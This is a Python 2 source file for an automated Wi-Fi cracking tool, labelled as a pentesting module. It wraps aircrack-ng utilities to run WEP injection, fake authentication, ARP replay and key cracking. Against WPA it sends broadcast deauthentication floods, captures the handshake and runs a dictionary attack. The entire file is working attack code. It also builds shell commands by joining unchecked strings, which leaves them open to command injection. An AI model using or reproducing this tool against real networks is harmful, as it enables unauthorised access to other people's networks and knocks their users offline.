from subprocess import Popen, PIPE
import os
from sys import stdout
from signal import SIGINT
import sched
import signal
import csv
import time
import commands
from execute import execute
from network import get_mac_address
from threading import Timer
DN = open(os.devnull, 'w')


def send_interrupt(process):
    try:
        os.kill(process.pid, SIGINT)
        # os.kill(process.pid, SIGTERM)
    except OSError:
        pass  # process cannot be killed
    except TypeError:
        pass  # pid is incorrect type
    except UnboundLocalError:
        pass  # 'process' is not defined
    except AttributeError:
        pass  # Trying to kill "None"


class Attack():
    ''' @brief This class is attack function module for pentesting.
    '''
    def __init__(self, iface, channel, bssid, essid, enc_type, timeout=300):
        self.iface      = iface
        self.enc_type   = enc_type
        self.channel    = channel
        self.bssid      = bssid
        self.essid      = essid
        self.my_mac     = get_mac_address(iface)
        self.ivs = 0
        self.key = ''
        self.inject_sig     = False
        self.fake_auth_sig  = False
        self.arp_req_sig    = False
        self.crack_success  = False
        self.timeout        = int(timeout)
        self.scheduler      = sched.scheduler(time.time, time.sleep)
        self.proc_list       = []
        self.password_list  = './dict/password.lst'

    def channel_change(self):
        cmd = ['iw', 'dev', self.iface, 'set', 'channel', self.channel]
        Popen(cmd, stdout=PIPE, stderr=DN)

    def wep_inject(self):
        self.channel_change()
        cmd = ['aireplay-ng', '-9', '--ignore-negative-one', '-e', self.essid, '-a', self.bssid, self.iface]
        inject_proc = Popen(cmd, stdout=PIPE, stderr=DN)
        inject_proc.wait()
        out = inject_proc.communicate()
        try:
            success = out[0].split('\n')[7]
            if success.find('30/30') == -1:
                self.inject_sig = False
            else:
                self.inject_sig = True
        except IndexError:
            self.channel_change()

    def wep_fake_auth(self):
        max_wait = 3  # Time, in seconds, to allow each fake authentication
        max_attempts = 5  # Number of attempts to make

        for fa_index in xrange(1, max_attempts + 1):
            self.channel_change()
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                    '-1', '0',  # Fake auth, no delay
                    '-a', self.bssid,
                    '-T', '1']  # Make 1 attempt
            if self.essid != '':
                cmd.append('-e')
                cmd.append(self.essid)
            cmd.append(self.iface)
            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
            self.proc_list.append(proc_fakeauth)
            started = time.time()

            while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
            if time.time() - started > max_wait:
                send_interrupt(proc_fakeauth)
                stdout.flush()
                time.sleep(0.5)
                continue

            result = proc_fakeauth.communicate()[0].lower()
            if result.find('switching to shared key') != -1 or \
                    result.find('rejects open system'): pass
            if result.find('association successful') != -1:
                self.fake_auth_sig = True

            stdout.flush()
            time.sleep(0.5)
            continue
        self.fake_auth_sig = False

    def send_deauths(self):
        #self.channel_change()
        cmd = ['aireplay-ng',
               '--ignore-negative-one',
               '--deauth', '5',
               '-a', self.bssid,
               '-h', 'FF:FF:FF:FF:FF:FF']
        if self.essid != '':
            cmd.append('-e')
            cmd.append(self.essid)
        cmd.append(self.iface)

        deauth_proc = Popen(cmd, stdout=DN, stderr=DN)
        deauth_proc.wait()

    def wep_arp_send(self):
        self.channel_change()
        cmd = ['aireplay-ng',
               '-3', '-b', self.bssid,
               '-h', self.my_mac, self.iface]
        arp_proc = Popen(cmd, stdout=DN, stderr=DN)
        self.proc_list.append(arp_proc)

    def run(self):
        self.scheduler.enter(self.timeout, 1, self.handler, ())
        execute('rm ./log/'+self.bssid+'*')
        execute('ifconfig '+self.iface+' down')
        execute('iwconfig '+self.iface+' mode monitor')

        if 'WEP' in self.enc_type.upper():
            self.wep_run()
        elif 'WPA' in self.enc_type.upper():
            self.wpa_run()
        elif 'OPN' in self.enc_type.upper():
            self.key = "OPN"
        else:
            self.key = True



    def get_value(self):
        return_value = {'essid': self.essid,
                        'bssid': self.bssid,
                        'inject_T': self.inject_sig,
                        'fake_auth_T': self.fake_auth_sig,
                        'arp_req_T': self.arp_req_sig,
                        'key': self.key}
        return return_value

    def wep_run(self):
        execute('rm -rf replay_arp*.cap')
        self.channel_change()
        self.wep_inject()

        dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', './log/' + self.bssid, self.iface]
        airodump_proc = Popen(dump_cmd, stdout=DN, stderr=DN)

        self.wep_fake_auth()
        self.wep_arp_send()

        crack_iv = 5000
        while self.key == '':
            key_reader = csv.reader(open('./log/'+self.bssid+'-01.csv'))
            line = list(key_reader)
            try:
                self.ivs = int(line[2][10])
                if self.ivs > crack_iv:
                    execute('rm ./log/'+self.bssid+'.key')

                    crack_cmd = ['aircrack-ng', '-b', self.bssid, './log/' + self.bssid + '-01.cap', '-l', './log/' + self.bssid + '.key']
                    crack_proc = Popen(crack_cmd, stdout=DN, stderr=DN)
                    kill_proc = lambda p: p.kill()
                    timer = Timer(20, kill_proc, [crack_proc])
                    try:
                        timer.start()
                        crack_proc.communicate()
                    finally:
                        timer.cancel()
                    try:
                        f = open('./log/' + self.bssid + '.key')
                        key = f.read()
                        self.key = str(key.decode('hex'))
                        self.crack_success = True
                        airodump_proc.kill()
                        airodump_proc.communicate()
                        self.stop()
                    except IOError:
                        crack_iv = crack_iv + 5000
                time.sleep(5)
            except:
                pass
        return self.key

    def wpa_run(self):
        dump_cmd = ['airodump-ng', '-c', self.channel, '--bssid', self.bssid, '-w', './log/' + self.bssid, self.iface]
        airodump_proc = Popen(dump_cmd, stdout=DN, stderr=DN)

        self.proc_list.append(airodump_proc)

        self.send_deauths()
        while self.key == '':
            output = commands.getoutput('tshark -r ./log/' + self.bssid + '-01.cap | grep "Message 4 of 4"')
            if output.find('Message 4 of 4') != -1:
                execute('rm ./log/'+self.bssid+'.key')
                airodump_proc.kill()
                airodump_proc.communicate()
                crack_cmd = ['aircrack-ng', '-w', self.password_list, '-b', self.bssid, './log/' + self.bssid + '-01.cap','-l', './log/' + self.bssid + '.key']
                crack_proc = Popen(crack_cmd, stdout=DN)
                crack_proc.wait()
                try:
                    f = open('./log/' + self.bssid + '.key')
                    key = f.read()
                    self.key = key
                    self.crack_success = True
                    self.stop()
                except:
                    pass
            else:
                self.send_deauths()
                time.sleep(5)
        return self.key

    def stop(self):
        for proc in self.proc_list:
            try:
                proc.kill()
                proc.communicate()
            except:
                pass

    def handler(self):
        self.stop()
        self.key = False